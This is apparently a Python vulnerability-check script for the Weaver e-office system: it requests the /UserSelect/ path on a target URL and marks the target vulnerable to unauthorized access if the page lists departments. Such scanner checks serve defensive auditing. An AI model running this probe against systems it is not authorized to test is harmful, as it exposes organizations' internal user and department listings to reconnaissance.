import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微e-office系统UserSelect接口存在未授权访问漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/UserSelect/")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        if response.status_code == 200 and '所有部门' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult